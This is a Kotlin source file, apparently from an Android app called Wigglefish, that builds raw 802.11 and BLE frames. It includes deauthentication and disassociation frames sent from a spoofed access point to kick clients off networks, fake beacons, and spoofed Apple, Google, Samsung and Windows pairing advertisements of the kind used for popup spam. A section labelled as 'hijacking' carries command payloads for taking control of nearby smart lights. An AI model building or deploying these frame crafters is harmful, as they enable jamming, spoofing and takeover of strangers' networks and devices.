package com.wigglefish.android

import java.io.ByteArrayOutputStream
import java.util.Random

/**
 * Low-level 802.11 and Bluetooth Low Energy frame crafting engine.
 * Generates standards-compliant frames for transmission by dumb radio transceiver firmware.
 */
object RadioProtocols {

    private val random = Random()

    // -------------------------------------------------------------
    // MAC & Hex Helpers
    // -------------------------------------------------------------

    fun parseMac(macStr: String): ByteArray {
        val clean = macStr.replace(":", "").replace("-", "").trim()
        if (clean.length != 12) {
            return ByteArray(6) { 0xFF.toByte() }
        }
        val bytes = ByteArray(6)
        for (i in 0 until 6) {
            bytes[i] = clean.substring(i * 2, i * 2 + 2).toInt(16).toByte()
        }
        return bytes
    }

    fun formatMac(bytes: ByteArray, offset: Int = 0): String {
        if (bytes.size < offset + 6) return "00:00:00:00:00:00"
        return (0 until 6).joinToString(":") { "%02X".format(bytes[offset + it].toInt() and 0xFF) }
    }

    fun bytesToHex(bytes: ByteArray, len: Int = bytes.size): String {
        val sb = StringBuilder(len * 2)
        for (i in 0 until len) {
            sb.append("%02x".format(bytes[i].toInt() and 0xFF))
        }
        return sb.toString()
    }

    fun hexToBytes(hex: String): ByteArray {
        val clean = hex.replace(" ", "").trim()
        val len = clean.length
        val data = ByteArray(len / 2)
        for (i in 0 until len step 2) {
            data[i / 2] = clean.substring(i, i + 2).toInt(16).toByte()
        }
        return data
    }

    fun generateRandomMac(): ByteArray {
        val mac = ByteArray(6)
        random.nextBytes(mac)
        // Set locally administered, unicast bit (e.g. 02:xx:xx:xx:xx:xx)
        mac[0] = ((mac[0].toInt() and 0xFC) or 0x02).toByte()
        return mac
    }

    // -------------------------------------------------------------
    // 802.11 Wi-Fi Frame Builders
    // -------------------------------------------------------------

    /**
     * Builds an 802.11 Beacon frame.
     */
    fun createBeaconFrame(
        ssid: String,
        bssid: ByteArray = generateRandomMac(),
        channel: Int = 1,
        isWpa2: Boolean = true
    ): ByteArray {
        val stream = ByteArrayOutputStream(256)

        // 1. Frame Control: Type = Management (0x00), Subtype = Beacon (0x08) -> 0x80 0x00
        stream.write(0x80)
        stream.write(0x00)

        // 2. Duration / ID: 0x0000
        stream.write(0x00)
        stream.write(0x00)

        // 3. Destination Address: FF:FF:FF:FF:FF:FF (Broadcast)
        stream.write(byteArrayOf(0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte()))

        // 4. Source Address: BSSID
        stream.write(bssid, 0, 6)

        // 5. BSSID
        stream.write(bssid, 0, 6)

        // 6. Sequence Control: Sequence 0, Fragment 0
        val seqNum = (random.nextInt(4096) shl 4)
        stream.write(seqNum and 0xFF)
        stream.write((seqNum shr 8) and 0xFF)

        // --- Management Frame Body ---

        // 7. Timestamp: 8 bytes (Simulated microseconds)
        val nowUs = System.currentTimeMillis() * 1000L
        for (i in 0 until 8) {
            stream.write(((nowUs shr (i * 8)) and 0xFF).toInt())
        }

        // 8. Beacon Interval: 100 Time Units (0x0064 = 102.4ms)
        stream.write(0x64)
        stream.write(0x00)

        // 9. Capability Information: ESS (0x0001) + Privacy (0x0010) if WPA2, Short Preamble (0x0020)
        val caps = 0x0001 or (if (isWpa2) 0x0010 else 0x0000) or 0x0020
        stream.write(caps and 0xFF)
        stream.write((caps shr 8) and 0xFF)

        // --- Tagged Information Elements (IEs) ---

        // Tag 0: SSID parameter set
        val ssidBytes = ssid.toByteArray(Charsets.UTF_8)
        stream.write(0x00) // Tag Number
        stream.write(ssidBytes.size) // Tag Length
        stream.write(ssidBytes)

        // Tag 1: Supported Rates (1, 2, 5.5, 11, 6, 9, 12, 18 Mbps)
        val rates = byteArrayOf(0x82.toByte(), 0x84.toByte(), 0x8B.toByte(), 0x96.toByte(), 0x0C, 0x12, 0x18, 0x24)
        stream.write(0x01)
        stream.write(rates.size)
        stream.write(rates)

        // Tag 3: DS Parameter Set (Current Channel)
        stream.write(0x03)
        stream.write(0x01)
        stream.write(channel and 0xFF)

        // Tag 5: Traffic Indication Map (TIM)
        val tim = byteArrayOf(0x00, 0x01, 0x00, 0x00)
        stream.write(0x05)
        stream.write(tim.size)
        stream.write(tim)

        // Tag 48: RSN / WPA2 Information Element (if enabled)
        if (isWpa2) {
            val rsn = byteArrayOf(
                0x01, 0x00,                         // Version: 1
                0x00, 0x0F, 0xAC.toByte(), 0x04,     // Group Cipher Suite: CCMP (00-0F-AC:04)
                0x01, 0x00,                         // Pairwise Suite Count: 1
                0x00, 0x0F, 0xAC.toByte(), 0x04,     // Pairwise Suite: CCMP (00-0F-AC:04)
                0x01, 0x00,                         // AKM Suite Count: 1
                0x00, 0x0F, 0xAC.toByte(), 0x02,     // AKM Suite: PSK (00-0F-AC:02)
                0x00, 0x00                          // RSN Capabilities
            )
            stream.write(0x30) // Tag 48 = 0x30
            stream.write(rsn.size)
            stream.write(rsn)
        }

        return stream.toByteArray()
    }

    /**
     * Builds an 802.11 Deauthentication frame.
     */
    fun createDeauthFrame(
        apMac: ByteArray,
        clientMac: ByteArray = byteArrayOf(0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte()),
        reasonCode: Short = 7
    ): ByteArray {
        val stream = ByteArrayOutputStream(32)

        // 1. Frame Control: Type = Management (0x00), Subtype = Deauth (0x0C) -> 0xC0 0x00
        stream.write(0xC0)
        stream.write(0x00)

        // 2. Duration: 0x013A (314 microseconds)
        stream.write(0x3A)
        stream.write(0x01)

        // 3. Destination Address (Client being kicked, or broadcast)
        stream.write(clientMac, 0, 6)

        // 4. Source Address (Spoofed Access Point)
        stream.write(apMac, 0, 6)

        // 5. BSSID
        stream.write(apMac, 0, 6)

        // 6. Sequence Control
        val seqNum = (random.nextInt(4096) shl 4)
        stream.write(seqNum and 0xFF)
        stream.write((seqNum shr 8) and 0xFF)

        // 7. Reason Code (16-bit little-endian)
        // 1 = Unspecified, 2 = Prev Auth not valid, 7 = Class 3 frame received from nonassociated STA
        stream.write(reasonCode.toInt() and 0xFF)
        stream.write((reasonCode.toInt() shr 8) and 0xFF)

        return stream.toByteArray()
    }

    /**
     * Builds an 802.11 Disassociation frame.
     */
    fun createDisassocFrame(
        apMac: ByteArray,
        clientMac: ByteArray = byteArrayOf(0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte()),
        reasonCode: Short = 8
    ): ByteArray {
        val stream = ByteArrayOutputStream(32)

        // 1. Frame Control: Type = Management (0x00), Subtype = Disassoc (0x0A) -> 0xA0 0x00
        stream.write(0xA0)
        stream.write(0x00)

        // 2. Duration
        stream.write(0x3A)
        stream.write(0x01)

        // 3. DA
        stream.write(clientMac, 0, 6)
        // 4. SA
        stream.write(apMac, 0, 6)
        // 5. BSSID
        stream.write(apMac, 0, 6)

        // 6. Seq
        val seqNum = (random.nextInt(4096) shl 4)
        stream.write(seqNum and 0xFF)
        stream.write((seqNum shr 8) and 0xFF)

        // 7. Reason Code (8 = Disassociated because sending STA is leaving)
        stream.write(reasonCode.toInt() and 0xFF)
        stream.write((reasonCode.toInt() shr 8) and 0xFF)

        return stream.toByteArray()
    }

    /**
     * Builds an 802.11 Probe Request frame.
     */
    fun createProbeRequest(
        ssid: String = "",
        clientMac: ByteArray = generateRandomMac()
    ): ByteArray {
        val stream = ByteArrayOutputStream(64)

        // 1. Frame Control: Type = Management (0x00), Subtype = Probe Req (0x04) -> 0x40 0x00
        stream.write(0x40)
        stream.write(0x00)

        // 2. Duration
        stream.write(0x00)
        stream.write(0x00)

        // 3. DA: Broadcast
        stream.write(byteArrayOf(0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte()))
        // 4. SA: Client MAC
        stream.write(clientMac, 0, 6)
        // 5. BSSID: Broadcast
        stream.write(byteArrayOf(0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte()))

        // 6. Seq
        val seqNum = (random.nextInt(4096) shl 4)
        stream.write(seqNum and 0xFF)
        stream.write((seqNum shr 8) and 0xFF)

        // Tag 0: SSID
        val ssidBytes = ssid.toByteArray(Charsets.UTF_8)
        stream.write(0x00)
        stream.write(ssidBytes.size)
        stream.write(ssidBytes)

        // Tag 1: Supported Rates
        val rates = byteArrayOf(0x82.toByte(), 0x84.toByte(), 0x8B.toByte(), 0x96.toByte(), 0x0C, 0x12, 0x18, 0x24)
        stream.write(0x01)
        stream.write(rates.size)
        stream.write(rates)

        return stream.toByteArray()
    }

    // -------------------------------------------------------------
    // BLE Ecosystem Advertisement Builders
    // -------------------------------------------------------------

    enum class AppleDevice(val modelHex: String, val displayName: String) {
        AIRPODS_PRO("0E20", "AirPods Pro"),
        AIRPODS_MAX("0A20", "AirPods Max"),
        AIRPODS_3("1320", "AirPods 3rd Gen"),
        POWERBEATS_PRO("0B20", "Powerbeats Pro"),
        APPLE_TV_SETUP("0404", "AppleTV Setup"),
        AIRDROP("0100", "AirDrop"),
        TRANSFER_NUMBER("0200", "Transfer Phone Number"),
        CONNECT_NEW_DEVICE("0500", "New Device Setup")
    }

    /**
     * Builds an Apple Continuity / Proximity Pairing BLE Advertisement.
     */
    fun createAppleAdv(device: AppleDevice = AppleDevice.AIRPODS_PRO): ByteArray {
        val stream = ByteArrayOutputStream(31)

        // Flags: LE General Discoverable Mode, BR/EDR Not Supported (0x06)
        stream.write(0x02) // Length
        stream.write(0x01) // Type: Flags
        stream.write(0x06)

        // Manufacturer Data: Apple Inc. (0x004C)
        val devBytes = hexToBytes(device.modelHex)
        val mfrStream = ByteArrayOutputStream(24)
        mfrStream.write(0x4C) // Apple ID (0x004C LE)
        mfrStream.write(0x00)
        mfrStream.write(0x07) // Continuity Type: Proximity Pairing
        mfrStream.write(0x13) // Continuity Length (19 bytes)
        mfrStream.write(0x01) // Prefix
        mfrStream.write(devBytes) // Device Model
        mfrStream.write(byteArrayOf(0x55, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00))

        val mfrPayload = mfrStream.toByteArray()
        val mfrLen = minOf(mfrPayload.size, 27)
        stream.write(mfrLen + 1) // Length including Type
        stream.write(0xFF)       // Type: Manufacturer Specific
        stream.write(mfrPayload, 0, mfrLen)

        return stream.toByteArray()
    }

    /**
     * Builds a Google Fast Pair BLE Advertisement.
     */
    fun createAndroidFastPairAdv(modelId: Int = 0xF37335): ByteArray {
        val stream = ByteArrayOutputStream(31)

        // Flags
        stream.write(0x02)
        stream.write(0x01)
        stream.write(0x06)

        // 16-bit Service UUID: 0xFE2C (Google Fast Pair Service)
        stream.write(0x03)
        stream.write(0x03) // Complete 16-bit Service UUIDs
        stream.write(0x2C)
        stream.write(0xFE.toByte().toInt())

        // Service Data for 0xFE2C with Model ID (3 bytes)
        val modelBytes = byteArrayOf(
            ((modelId shr 16) and 0xFF).toByte(),
            ((modelId shr 8) and 0xFF).toByte(),
            (modelId and 0xFF).toByte()
        )
        stream.write(0x06) // Length: 2 (UUID) + 3 (Model ID) + 1 (TxPower/Salt)
        stream.write(0x16) // Service Data - 16-bit UUID
        stream.write(0x2C)
        stream.write(0xFE.toByte().toInt())
        stream.write(modelBytes)
        stream.write(0x00) // Tx Power byte

        return stream.toByteArray()
    }

    /**
     * Builds a Samsung Galaxy Buds / Watch BLE Pairing Advertisement.
     */
    fun createSamsungBudsAdv(): ByteArray {
        val stream = ByteArrayOutputStream(31)

        // Flags
        stream.write(0x02)
        stream.write(0x01)
        stream.write(0x06)

        // Manufacturer Data: Samsung Electronics (0x0075)
        val mfrData = byteArrayOf(
            0x75, 0x00, // Samsung ID (0x0075 LE)
            0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF.toByte(), 0x00, 0x00, 0x43
        )
        stream.write(mfrData.size + 1)
        stream.write(0xFF)
        stream.write(mfrData)

        return stream.toByteArray()
    }

    /**
     * Builds a Windows Swift Pair BLE Advertisement.
     */
    fun createWindowsSwiftPairAdv(displayName: String = "Wigglefish Peripheral"): ByteArray {
        val stream = ByteArrayOutputStream(31)

        // Flags
        stream.write(0x02)
        stream.write(0x01)
        stream.write(0x06)

        // Manufacturer Data: Microsoft (0x0006) Swift Pair Beacon Sub-scenario (0x03)
        val nameBytes = displayName.toByteArray(Charsets.UTF_8)
        val maxNameLen = minOf(nameBytes.size, 18)
        val mfrLen = 4 + maxNameLen
        stream.write(mfrLen + 1)
        stream.write(0xFF)
        stream.write(0x06) // Microsoft ID (0x0006 LE)
        stream.write(0x00)
        stream.write(0x03) // Sub-scenario: Swift Pair
        stream.write(0x80.toByte().toInt()) // RSSI threshold byte
        stream.write(nameBytes, 0, maxNameLen)

        return stream.toByteArray()
    }

    // -------------------------------------------------------------
    // Smart RGB Light & Bulb Hijacking Protocols
    // -------------------------------------------------------------

    /**
     * Builds a Triones / HappyLighting / Lotus Lantern BLE GATT command payload.
     * Service UUID: 0xFFD5 or 0xFFE0, Characteristic: 0xFFD9 or 0xFFE1
     */
    fun createTrionesRgb(r: Int, g: Int, b: Int): ByteArray {
        return byteArrayOf(
            0x56,
            (r and 0xFF).toByte(),
            (g and 0xFF).toByte(),
            (b and 0xFF).toByte(),
            0x00,
            0xF0.toByte(),
            0xAA.toByte()
        )
    }

    /**
     * Builds a Lotus Lantern / 9-byte Smart LED command payload.
     */
    fun createLotusLanternRgb(r: Int, g: Int, b: Int): ByteArray {
        return byteArrayOf(
            0x7E,
            0x07,
            0x05,
            0x03,
            (r and 0xFF).toByte(),
            (g and 0xFF).toByte(),
            (b and 0xFF).toByte(),
            0x00,
            0xEF.toByte()
        )
    }

    /**
     * Builds an Elk-BLEDOM / HiLighting LED strip command payload.
     * Characteristic: 0xFFF3 or 0xFFE1
     */
    fun createElkBledomRgb(r: Int, g: Int, b: Int): ByteArray {
        return byteArrayOf(
            0x7E,
            0x04,
            0x04,
            (r and 0xFF).toByte(),
            (g and 0xFF).toByte(),
            (b and 0xFF).toByte(),
            0xFF.toByte(),
            0x00,
            0xEF.toByte()
        )
    }

    /**
     * Builds an Elk-BLEDOM / Triones Power On/Off command payload.
     */
    fun createSmartLightPower(on: Boolean): ByteArray {
        return if (on) {
            byteArrayOf(0x7E, 0x04, 0x04, 0xF0.toByte(), 0x00, 0x01, 0xFF.toByte(), 0x00, 0xEF.toByte())
        } else {
            byteArrayOf(0x7E, 0x04, 0x04, 0x00, 0x00, 0x00, 0xFF.toByte(), 0x00, 0xEF.toByte())
        }
    }

    /**
     * Builds a MagicHome Wi-Fi LED Controller UDP payload (sent to port 5577).
     */
    fun createMagicHomeUdpRgb(r: Int, g: Int, b: Int): ByteArray {
        val cr = r and 0xFF
        val cg = g and 0xFF
        val cb = b and 0xFF
        val checksum = (0x31 + cr + cg + cb + 0x00 + 0xF0 + 0x0F) and 0xFF
        return byteArrayOf(
            0x31,
            cr.toByte(),
            cg.toByte(),
            cb.toByte(),
            0x00,
            0xF0.toByte(),
            0x0F,
            checksum.toByte()
        )
    }

    /**
     * Builds an Apple iBeacon BLE Advertisement.
     */
    fun createIBeaconAdv(uuidHex: String = "FDA50693A4E24FB1AFCFC6EB07647825", major: Int = 10001, minor: Int = 19641): ByteArray {
        val stream = ByteArrayOutputStream(31)
        stream.write(byteArrayOf(0x02, 0x01, 0x06)) // Flags
        stream.write(0x1A) // Length 26
        stream.write(0xFF) // Type Mfr Specific
        stream.write(byteArrayOf(0x4C, 0x00)) // Apple ID
        stream.write(byteArrayOf(0x02, 0x15)) // iBeacon SubType
        stream.write(hexToBytes(uuidHex))
        stream.write((major shr 8) and 0xFF)
        stream.write(major and 0xFF)
        stream.write((minor shr 8) and 0xFF)
        stream.write(minor and 0xFF)
        stream.write(0xC5.toByte().toInt()) // Tx Power (-59dBm)
        return stream.toByteArray()
    }
}
